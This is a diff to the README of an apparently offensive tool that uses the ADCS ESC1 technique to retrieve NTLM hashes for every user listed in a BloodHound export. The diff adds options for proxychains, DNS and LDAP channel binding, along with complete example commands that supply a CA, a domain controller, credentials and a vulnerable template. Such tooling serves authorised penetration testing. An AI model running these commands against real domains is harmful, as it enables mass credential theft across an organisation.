@@ -57,18 +57,27 @@ Retrieve NTLM hashes via ADCS ESC1 technique.
 
 options:
   -h, --help            show this help message and exit
-  -f, --file FILE       Input User List JSON file from Bloodhound
-  -o, --output OUTPUT   NTLM Hash Output file
+  -f FILE, --file FILE  Input User List JSON file from Bloodhound
+  -o OUTPUT, --output OUTPUT
+                        NTLM Hash Output file
   -ca-name CA_NAME      Certificate Authority
   -dc-ip DC_IP          IP Address of Domain Controller
   -dc-fqdn DC_FQDN      FQDN of Domain Controller
-  -u, --user USER       Username
-  -p, --password PASSWORD
+  -u USER, --user USER  Username
+  -p PASSWORD, --password PASSWORD
                         Password
   -template TEMPLATE    Template Name vulnerable to ESC1
   -target TARGET        CA FQDN
-  -t, --threads THREADS
+  -t THREADS, --threads THREADS
                         Number of threads to use. (default=4)
+  -dns-tcp              use dns-tcp for proxychains4
+  -dns DNS              the DC FQDN, useful for proxychains4
+  -ns NAME_SERVER, --name-server NAME_SERVER
+                        name server, useful for proxychains, should be the same as the dc-ip
+                        value most of the time
+  -timeout TIMEOUT      timeout value for dns resolution, useful for proxychains4
+  -ldap-channel-binding
+                        useful if target requires ldap channel binding
   -debug                Show verbose debugging information
   -proxychains          Use proxychains4
 ```
@@ -80,6 +89,27 @@ python3 ADCSync_multi_log_full_with_retry.py -f all-ad.corp.local-users.json \
 -o dcsync.txt \
 -ca-name FOO-CA \
 -dc-ip 10.10.10.10 \
+-dc-fqdn cool-dc1.ad.corp.local \
+-u 'coolbeans@ad.corp.local' \
+-p 'PASSWORDHERE' \
+-template VULN-ESC1-TEMPLATE-NAME \
+-target CA-FQDN.ad.corp.local \
+-proxychains \
+-debug
+```
+
+Example command with ldap-channel-binding, timeout, nameserver, dns, and dns-tcp :
+
+```shell
+python3 ADCSync_multi_log_full_with_retry.py -f all-ad.corp.local-users.json \
+-o dcsync.txt \
+-ca-name FOO-CA \
+-dc-ip 10.10.10.10 \
+-ns 10.10.10.10 \
+-dns-tcp \
+-dns cool-dc1.ad.corp.local \
+-timeout 30 \
+-ldap-channel-binding \
 -dc-fqdn cool-dc1.ad.corp.local \
 -u 'coolbeans@ad.corp.local' \
 -p 'PASSWORDHERE' \
